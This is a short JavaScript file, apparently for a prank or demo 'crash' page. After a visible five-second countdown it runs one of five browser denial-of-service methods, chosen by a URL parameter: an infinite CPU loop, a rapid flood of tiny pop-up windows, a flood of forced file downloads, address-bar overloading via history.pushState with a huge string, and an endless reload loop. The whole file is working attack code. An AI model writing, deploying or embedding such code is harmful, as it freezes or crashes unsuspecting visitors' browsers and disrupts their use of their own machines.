(function() {
    const methods = [
        // cpu-bound infinite loop
        () => {
            for(;;){}
        },

        // multiple window/tab opener
        () => {
            setInterval(() => {
                window.open("", "", "width=1,height=1");
            }, 10);
        },

        // download popup opener
        () => {
            const download = (text) => {
                const blob = new Blob([text], { type: "text/plain" });
                const url = URL.createObjectURL(blob);
                const link = document.createElement("a");
                link.href = url;
                link.download = "LOL.txt";

                document.body.appendChild(link);
                link.click();

                document.body.removeChild(link);
                URL.revokeObjectURL(url);
            }

            setInterval(() => {
                download("not happy about you");
            }, 50);
        },

        // URL address bar overloading
        () => {
            const total = "0".repeat(999999);
            setInterval(() => {
                history.pushState(0, 0, total);
            }, 50);
        },


        // Infinite reload attack
        () => {
            window.onbeforeunload = function() {
                // additional attack vector
                localStorage.x = 1;
            }

            setTimeout(() => {
                for(;;) location.reload(1);
            }, 100);
        }
    ];

    const params = new URLSearchParams(window.location.search);
    const type = Number(params.get("type")) || 0;
    const crashType = type >= 0 && type <= methods.length - 1 ? type : 0;

    let count = 5;
    const crashText = document.querySelector("#crash-text");

    let interval;
    const loop = () => {
        crashText.textContent = `Page will be crashed in: ${count--}`;
        
        if (count < 0) {
            clearInterval(interval);
            crashText.textContent = "Crashing...";
            
            setTimeout(() => {
                methods[crashType]();
            }, 1);
        }
    }

    loop();
    interval = setInterval(loop, 1000);
})();